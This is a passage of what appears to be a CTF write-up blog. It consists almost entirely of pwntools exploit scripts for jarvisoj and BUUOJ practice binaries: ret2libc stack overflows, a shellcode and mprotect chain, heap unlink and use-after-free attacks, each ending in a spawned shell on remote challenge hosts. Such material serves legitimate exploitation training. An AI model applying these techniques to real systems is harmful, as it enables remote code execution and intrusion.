&#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global lib</span><br><span class="line">	global sh</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;level4&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;libc-2.23_x32.so&quot;)</span><br><span class="line">	pop_ebx_ret &#x3D; elf.search(asm(&quot;pop ebx\nret&quot;)).next()</span><br><span class="line">	pop3_ret &#x3D; elf.search(asm(&quot;pop esi\npop edi\npop ebp\nret&quot;)).next()</span><br><span class="line">	offset &#x3D; 140</span><br><span class="line">	payload &#x3D; offset * &#39;a&#39;</span><br><span class="line">	payload +&#x3D; p32(elf.plt[&#39;write&#39;])</span><br><span class="line">	payload +&#x3D; p32(0x08048470)</span><br><span class="line">	payload +&#x3D; p32(1)</span><br><span class="line">	payload +&#x3D; p32(elf.got[&#39;__libc_start_main&#39;])</span><br><span class="line">	payload +&#x3D; p32(4)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	__libc_start_main &#x3D; u32(sh.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">	libc &#x3D; __libc_start_main - lib.symbols[&#39;__libc_start_main&#39;]</span><br><span class="line">	system &#x3D; libc +lib.symbols[&#39;system&#39;]</span><br><span class="line">	binsh &#x3D; libc +lib.search(&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">	__free_hook &#x3D; libc +lib.symbols[&#39;__free_hook&#39;]</span><br><span class="line">	__malloc_hook &#x3D; libc +lib.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">	</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	payload &#x3D; offset * &#39;a&#39;</span><br><span class="line">	payload +&#x3D; p32(system)</span><br><span class="line">	payload +&#x3D; p32(0x08048470)</span><br><span class="line">	payload +&#x3D; p32(binsh)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;node3.buuoj.cn&quot;,25858,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x86-jarvisoj-level5">0x86 jarvisoj_level5</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;level3_x64&quot;)</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	if debug &#x3D;&#x3D; 1:</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;level3_x64&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;libc6_2.23-0ubuntu10_amd64.so&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;libc6_2.19-0ubuntu6.14_amd64.so&quot;)</span><br><span class="line">	offset &#x3D; 136</span><br><span class="line">	pop_rdi_ret &#x3D; 0x00000000004006b3</span><br><span class="line">	pop_rsi_r15_ret &#x3D; 0x00000000004006b1</span><br><span class="line">	pop_rbx_rbp_r12_r13_r14_r15_ret &#x3D; 0x00000000004006AA</span><br><span class="line">	mov_edx_call &#x3D; 0x0000000000400690</span><br><span class="line">	vul_addr &#x3D; 0x00000000004005E6</span><br><span class="line">	#leak libc</span><br><span class="line">	payload &#x3D; offset * &quot;a&quot;</span><br><span class="line">	payload +&#x3D; p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(elf.got[&#39;__libc_start_main&#39;]) + p64(0) + p64(elf.plt[&#39;write&#39;]) + p64(elf.symbols[&#39;main&#39;])</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil(&quot;Input:\n&quot;)</span><br><span class="line">	__libc_start_main &#x3D; u64(sh.recv(8))</span><br><span class="line">	libc &#x3D; __libc_start_main - lib.symbols[&#39;__libc_start_main&#39;]</span><br><span class="line">	mprotect_addr &#x3D; libc + lib.symbols[&#39;mprotect&#39;]</span><br><span class="line">	log.success(&quot;__libc_start_main: &quot; + hex(__libc_start_main))</span><br><span class="line">	log.success(&quot;libc: &quot; + hex(libc))</span><br><span class="line">	log.success(&quot;mprotect_addr: &quot; + hex(mprotect_addr))</span><br><span class="line">	#write shellcode to bss and write vul_addr to bss_head</span><br><span class="line">	payload &#x3D; offset * &quot;a&quot;</span><br><span class="line">	payload +&#x3D; p64(pop_rdi_ret) + p64(0) #rdi &#x3D; 0</span><br><span class="line">	payload +&#x3D; p64(pop_rsi_r15_ret) + p64(elf.bss()) + p64(0) #rsi&#x3D;bss   r15 &#x3D; 0</span><br><span class="line">	payload +&#x3D; p64(elf.plt[&#39;read&#39;]) + p64(vul_addr)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	payload &#x3D; p64(mprotect_addr) + &quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil(&quot;Input:\n&quot;)</span><br><span class="line">	#mprotect</span><br><span class="line">	payload &#x3D; offset * &quot;a&quot;</span><br><span class="line">	payload +&#x3D; p64(pop_rbx_rbp_r12_r13_r14_r15_ret)</span><br><span class="line">	payload +&#x3D; p64(0) #rbx</span><br><span class="line">	payload +&#x3D; p64(1) #rbp</span><br><span class="line">	payload +&#x3D; p64(elf.bss()) #r12</span><br><span class="line">	payload +&#x3D; p64(7) #r13 to rdx</span><br><span class="line">	payload +&#x3D; p64(0x1000) #r14 to rsi</span><br><span class="line">	payload +&#x3D; p64((elf.bss() &gt;&gt; 16) &lt;&lt; 16) #r15 to rdi</span><br><span class="line">	payload +&#x3D; p64(mov_edx_call)</span><br><span class="line">	payload +&#x3D; p64(0) * 7</span><br><span class="line">	payload +&#x3D; p64(vul_addr)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil(&quot;Input:\n&quot;)</span><br><span class="line">	payload &#x3D; offset * &quot;a&quot;</span><br><span class="line">	payload +&#x3D; p64(elf.bss() + 8)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	#nc pwn2.jarvisoj.com 9884</span><br><span class="line">	pwn(&quot;pwn2.jarvisoj.com&quot;,9884,1)</span><br></pre></td></tr></table></figure>
<h2 id="0x87-jarvisoj-level6">0x87 jarvisoj_level6</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">elf &#x3D; ELF(&quot;freenote_x86&quot;)</span><br><span class="line">def showlist():</span><br><span class="line">	sh.recvuntil(&quot;Your choice: &quot;)</span><br><span class="line">	sh.sendline(&quot;1&quot;)</span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.recvuntil(&quot;Your choice: &quot;)</span><br><span class="line">	sh.sendline(&quot;2&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Length of new note: &quot;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&quot;Enter your note: &quot;)</span><br><span class="line">	sh.send(content)</span><br><span class="line">def free(index):</span><br><span class="line">	sh.recvuntil(&quot;Your choice: &quot;)</span><br><span class="line">	sh.sendline(&quot;4&quot;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">def edit(index,size,content):</span><br><span class="line">	sh.recvuntil(&quot;Your choice: &quot;)</span><br><span class="line">	sh.sendline(&quot;3&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Note number: &quot;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">	sh.recvuntil(&quot;Length of note: &quot;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&quot;Enter your note: &quot;)</span><br><span class="line">	sh.send(content)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	#bss 804A2EC</span><br><span class="line">	global sh</span><br><span class="line">	offset &#x3D; 0</span><br><span class="line">	if debug &#x3D;&#x3D; 1:</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;freenote_x86&quot;)</span><br><span class="line">	else:</span><br><span class="line">		lib &#x3D; ELF(&quot;libc-2.23_x32.so&quot;)</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">	add(7,&quot;a&quot;*7)	#idx 0</span><br><span class="line">	add(7,&#39;a&#39;*7)	#idx 1</span><br><span class="line">	free(0)</span><br><span class="line">	add(4,&quot;aaaa&quot;)		#idx 2</span><br><span class="line">	showlist()</span><br><span class="line">	sh.recvuntil(&quot;0. aaaa&quot;)</span><br><span class="line">	libc &#x3D; u32(sh.recv(4)) - 48 - 0x18 - lib.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">	__malloc_hook &#x3D; libc - 8</span><br><span class="line">	add(7,&quot;b&quot;*7)	#idx 3</span><br><span class="line">	add(7,&quot;c&quot;*7)	#idx 4</span><br><span class="line">	free(0)</span><br><span class="line">	free(2)</span><br><span class="line">	add(4,&quot;aaaa&quot;)</span><br><span class="line">	showlist()</span><br><span class="line">	sh.recvuntil(&quot;0. aaaa&quot;)</span><br><span class="line">	heap_base &#x3D; (u32(sh.recv(4)) &gt;&gt; 12) &lt;&lt; 12</span><br><span class="line">	free(0)</span><br><span class="line">	free(1)</span><br><span class="line">	free(3)</span><br><span class="line">	payload &#x3D; p32(0x0) + p32(0x81) + p32(heap_base + 0x18 - 12) + p32(heap_base + 0x18 - 8) + p32(0x80)	#chunk0</span><br><span class="line">	payload &#x3D; payload.ljust(0x80,&quot;6&quot;)</span><br><span class="line">	payload +&#x3D; p32(0x80) + p32(0x80)	#chunk1</span><br><span class="line">	payload &#x3D; payload.ljust(256,&quot;9&quot;)</span><br><span class="line">	payload +&#x3D; p32(0x80) + p32(0x81)	#chunk2</span><br><span class="line">	add(len(payload),payload)</span><br><span class="line">	free(1)</span><br><span class="line">	payload &#x3D; &quot;a&quot;*20</span><br><span class="line">	add(len(payload),payload)</span><br><span class="line">	showlist()</span><br><span class="line">	system_addr &#x3D; libc + lib.symbols[&#39;system&#39;]</span><br><span class="line">	binsh_addr &#x3D; libc + next(lib.search(&quot;&#x2F;bin&#x2F;sh\x00&quot;))</span><br><span class="line">	add(0x50,0x50*&quot;a&quot;)</span><br><span class="line">	payload &#x3D; &quot;\x250\x00\x00&quot; + p32(1)+p32(0x4) + p32(elf.got[&#39;free&#39;]) + p32(1) + p32(0x14) + p32(heap_base+0xc280) + p32(1) + p32(0x8) + p32(heap_base + 0xda8) + p32(0) + p32(heap_base + 0xB80) + p32(0)</span><br><span class="line">	payload &#x3D; payload.ljust(0x108,&quot;\x00&quot;)</span><br><span class="line">	edit(0,0x108,payload)</span><br><span class="line">	edit(0,4,p32(system_addr))</span><br><span class="line">	edit(2,8,&quot;&#x2F;bin&#x2F;sh\x00&quot;)</span><br><span class="line">	showlist()</span><br><span class="line">	free(2)</span><br><span class="line">	log.success(&quot;libc: &quot; + hex(libc))</span><br><span class="line">	log.success(&quot;heap_base: &quot; + hex(heap_base))	</span><br><span class="line">	log.success(&quot;system_addr: &quot; + hex(system_addr))</span><br><span class="line">	log.success(&quot;binsh_addr: &quot; + hex(binsh_addr))</span><br><span class="line">	sh.interactive()	</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	#nc pwn2.jarvisoj.com 9885	</span><br><span class="line">	pwn(&quot;node3.buuoj.cn&quot;,27261,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x88-jarvisoj-level6-x64">0x88 jarvisoj_level6(x64)</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;freenote_x64&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def showlist():</span><br><span class="line">	sh.recvuntil(&quot;Your choice: &quot;)</span><br><span class="line">	sh.sendline(&quot;1&quot;)</span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.recvuntil(&quot;Your choice: &quot;)</span><br><span class="line">	sh.sendline(&quot;2&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Length of new note: &quot;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&quot;Enter your note: &quot;)</span><br><span class="line">	sh.send(content)</span><br><span class="line">def free(index):</span><br><span class="line">	sh.recvuntil(&quot;Your choice: &quot;)</span><br><span class="line">	sh.sendline(&quot;4&quot;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">def edit(index,size,content):</span><br><span class="line">	sh.recvuntil(&quot;Your choice: &quot;)</span><br><span class="line">	sh.sendline(&quot;3&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Note number: &quot;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">	sh.recvuntil(&quot;Length of note: &quot;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&quot;Enter your note: &quot;)</span><br><span class="line">	sh.send(content)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	offset &#x3D; 0</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;freenote_x64&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;libc-2.23.so&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;libc-2.23_x64.so&quot;)</span><br><span class="line">	#leak libc</span><br><span class="line">	add(0x80,&quot;a&quot;*0x80)#idx 0</span><br><span class="line">	add(0x80,&quot;b&quot;*0x80)#idx 1</span><br><span class="line">	free(0)</span><br><span class="line">	add(0x8,&quot;a&quot;*8)#idx 0</span><br><span class="line">	showlist()</span><br><span class="line">	sh.recvuntil(&quot;0. aaaaaaaa&quot;)</span><br><span class="line">	libc &#x3D; u64(sh.recvuntil(&quot;\x0a&quot;,True).ljust(0x8,&quot;\x00&quot;)) - 88 - lib.symbols[&#39;__malloc_hook&#39;] - 0x10</span><br><span class="line">	system_addr &#x3D; libc + lib.symbols[&#39;system&#39;]</span><br><span class="line">	binsh &#x3D; libc + next(lib.search(&quot;&#x2F;bin&#x2F;sh\x00&quot;))</span><br><span class="line">	#leak heap_base</span><br><span class="line">	add(0x80,&quot;c&quot;*0x80) #idx 2</span><br><span class="line">	add(0x80,&quot;d&quot;*0x80) #idx 3</span><br><span class="line">	free(0)</span><br><span class="line">	free(2)</span><br><span class="line">	add(0x8,&quot;d&quot;*8)</span><br><span class="line">	showlist()</span><br><span class="line">	sh.recvuntil(&quot;0. dddddddd&quot;)</span><br><span class="line">	heap_base &#x3D; sh.recvuntil(&quot;\x0a&quot;,True)</span><br><span class="line">	heap_base &#x3D; heap_base.ljust(0x8,&quot;\x00&quot;)</span><br><span class="line">	heap_base &#x3D; (u64(heap_base) - 0x1000)</span><br><span class="line">	heap_base &#x3D; (heap_base &gt;&gt; 12) &lt;&lt; 12</span><br><span class="line">	free(0)</span><br><span class="line">	free(1)</span><br><span class="line">	free(3)	</span><br><span class="line">	#unlink</span><br><span class="line">	payload &#x3D; p64(0x0) + p64(0x81) + p64(heap_base + 6 * 0x8 - 0x18) + p64(heap_base + 0x8 * 6 - 0x10)</span><br><span class="line">	payload &#x3D; payload.ljust(0x80,&quot;\xbb&quot;)</span><br><span class="line">	payload +&#x3D; p64(0x80) + p64(0x80)</span><br><span class="line">	payload &#x3D; payload.ljust(0x80+0x80,&quot;\xaa&quot;)</span><br><span class="line">	add(len(payload),payload)</span><br><span class="line">	#input()</span><br><span class="line">	free(1)</span><br><span class="line">	payload &#x3D; p64(1) + p64(1) + p64(0x100) + p64(heap_base + 0x18) + p64(1) + p64(8) + p64(heap_base + 0x1840) + p64(0) * 2 + p64(heap_base + 0x1950) + p64(0) + p64(0) + p64(heap_base + 0x19e0)</span><br><span class="line">	payload &#x3D; payload.ljust(0x400,&quot;a&quot;)</span><br><span class="line">	add(0x400,payload)</span><br><span class="line">	add(0x8,&quot;\x44&quot;*0x8)</span><br><span class="line">	#write system to free_got</span><br><span class="line"></span><br><span class="line">	payload &#x3D; p64(2) + p64(1) + p64(0x100) + p64(heap_base + 0x18) + p64(1) + p64(0x8) + p64(elf.got[&#39;free&#39;]) + p64(1) + p64(0x8) + p64(heap_base + 0x1950) + p64(0) + p64(0) + p64(heap_base + 0x19e0)</span><br><span class="line">	payload &#x3D; payload.ljust(0x100,&quot;a&quot;)</span><br><span class="line">	edit(0,0x100,payload)</span><br><span class="line">	showlist()</span><br><span class="line">	edit(1,0x8,p64(system_addr))</span><br><span class="line">	payload &#x3D; p64(2) + p64(1) + p64(0x100) + p64(heap_base + 0x18) + p64(1) + p64(8) + p64(binsh)+ p64(1) + p64(0x8) + p64(heap_base + 0x1950) + p64(1) + p64(0x8) +  p64(heap_base + 0x19e0)</span><br><span class="line">	payload &#x3D; payload.ljust(0x100,&quot;a&quot;)	</span><br><span class="line">	edit(0,0x100,payload)</span><br><span class="line">	free(1)</span><br><span class="line">	log.success(&quot;libc: &quot; + hex(libc))</span><br><span class="line">	log.success(&quot;binsh: &quot; + hex(binsh))</span><br><span class="line">	log.success(&quot;system_addr: &quot; + hex(system_addr))</span><br><span class="line">	log.success(&quot;heap_base: &quot; + hex(heap_base))</span><br><span class="line">	#gdb.attach(sh.pid)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;node3.buuoj.cn&quot;,29160,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x89-jarvisoj-test-your-memory">0x89 jarvisoj_test_your_memory</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh &#x3D; remote(&quot;node3.buuoj.cn&quot;,29078)</span><br><span class="line">#sh &#x3D; process(&quot;memory&quot;)</span><br><span class="line">system_address &#x3D; 0x080485BD</span><br><span class="line">junk &#x3D; &#39;a&#39; * 0x13</span><br><span class="line">ebp &#x3D; &#39;a&#39; * 0x4</span><br><span class="line">payload &#x3D; junk + ebp + p32(system_address) + p32(0x080487E0) + p32(0x080487E0)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="0x90-jarvisoj-itemboard">0x90 jarvisoj_itemboard</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">lib &#x3D; ELF(&quot;libc-2.23_x64.so&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">def free(idx):</span><br><span class="line">	sh.recvuntil(&quot;choose:\n&quot;)</span><br><span class="line">	sh.sendline(&quot;4&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Which item?\n&quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def show(idx):</span><br><span class="line">	sh.recvuntil(&quot;choose:\n&quot;)</span><br><span class="line">	sh.sendline(&quot;3&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Which item?&quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def showList():</span><br><span class="line">	sh.recvuntil(&quot;choose:\n&quot;)</span><br><span class="line">	sh.sendline(&quot;2&quot;)</span><br><span class="line"></span><br><span class="line">def add(name,size,content):</span><br><span class="line">	sh.recvuntil(&quot;choose:\n&quot;)</span><br><span class="line">	sh.sendline(&quot;1&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Item name?&quot;)</span><br><span class="line">	sh.sendline(name)</span><br><span class="line">	sh.recvuntil(&quot;len?\n&quot;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&quot;Description?\n&quot;)</span><br><span class="line">	sh.sendline(content)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;itemboard&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">	add(&quot;a&quot;*0x10,0x80,&quot;1&quot;*0x7F)</span><br><span class="line">	add(&quot;b&quot;*0x10,0x10,&quot;2&quot;*0xF)</span><br><span class="line">	free(0)</span><br><span class="line">	show(0)</span><br><span class="line">	sh.recvuntil(&quot;Description:&quot;)</span><br><span class="line">	main_arena &#x3D; u64(sh.recv(6)+&quot;\x00\x00&quot;) - 88</span><br><span class="line">	libc &#x3D; main_arena - lib.symbols[&#39;__malloc_hook&#39;] - 0x10</span><br><span class="line">	system_addr &#x3D; libc + lib.symbols[&#39;system&#39;]</span><br><span class="line">	add(&quot;c&quot;*0x10,0x20,&quot;3&quot;*0xF)</span><br><span class="line">	add(&quot;d&quot;*0x10,0x20,&quot;4&quot;*0xF)</span><br><span class="line">	free(1)</span><br><span class="line">	free(2)</span><br><span class="line">	show(2)</span><br><span class="line">	log.success(&quot;main_arena: &quot; + hex(main_arena))</span><br><span class="line">	log.success(&quot;system_addr: &quot; + hex(system_addr))</span><br><span class="line">	log.success(&quot;libc: &quot; + hex(libc))</span><br><span class="line">	add(&quot;6666&quot;,24,&quot;&#x2F;bin&#x2F;sh;eeeeeeee&quot;+p64(system_addr))</span><br><span class="line">	free(1)</span><br><span class="line"></span><br><span class="line">	sh.interactive()</span><br><span class="line">#nc pwn2.jarvisoj.com 9887</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;node3.buuoj.cn&quot;,27048,0)</span><br></pre></td></tr></table></figure>
